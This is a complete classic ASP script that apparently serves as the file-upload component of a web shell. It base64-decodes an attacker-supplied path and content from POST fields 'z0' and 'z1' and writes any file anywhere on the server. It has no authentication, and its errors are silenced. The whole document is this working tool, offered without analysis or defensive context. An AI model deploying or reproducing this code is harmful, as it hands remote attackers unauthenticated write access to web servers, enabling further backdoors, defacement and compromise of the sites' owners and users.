<%

On Error Resume Next

Function GetCurrentCharset()
    Dim charset
    charset = Response.CharSet
    
    If charset = "" Then
        Select Case Session.CodePage
            Case 65001 : charset = "utf-8"
            Case 1252  : charset = "windows-1252"
            Case 936   : charset = "gb2312"
            Case 950   : charset = "big5"
            Case 1251  : charset = "windows-1251"
            Case Else  : charset = "utf-8"
        End Select
    End If
    
    GetCurrentCharset = charset
End Function

Function Base64DecodeToText(byVal strIn)
    Dim xmlDoc, xmlNode
    Set xmlDoc = Server.CreateObject("MSXML2.DOMDocument.6.0")
    Set xmlNode = xmlDoc.createElement("tmp")
    xmlNode.dataType = "bin.base64"
    xmlNode.text = strIn
    
    Dim objStream
    Set objStream = Server.CreateObject("ADODB.Stream")
    objStream.Type = 1 ' Binary
    objStream.Open
    objStream.Write xmlNode.nodeTypedValue
    objStream.Position = 0
    objStream.Type = 2 ' Text
    objStream.Charset = GetCurrentCharset()
    
    Base64DecodeToText = objStream.ReadText
    
    objStream.Close
    Set objStream = Nothing
    Set xmlNode = Nothing
    Set xmlDoc = Nothing
End Function

Dim rawPath, rawContent
rawPath = Request.Form("z0")
rawContent = Request.Form("z1")

If rawPath = "" Or rawContent = "" Then
    Response.Write("ERROR://Missing parameters.")
    Response.End
End If

Dim szFilePath, szContent
szFilePath = Base64DecodeToText(rawPath)
szContent = Base64DecodeToText(rawContent)

Dim objFileStream
Set objFileStream = Server.CreateObject("ADODB.Stream")

objFileStream.Type = 2 ' Text
objFileStream.Charset = GetCurrentCharset()
objFileStream.Open
objFileStream.WriteText szContent

objFileStream.SaveToFile szFilePath, 2

Dim writeError
writeError = Err.Number
Dim writeDesc
writeDesc = Err.Description

objFileStream.Close
Set objFileStream = Nothing

If writeError <> 0 Then
    Response.Write("ERROR://" & writeDesc)
    Err.Clear
Else
    Response.Write("1")
End If
%>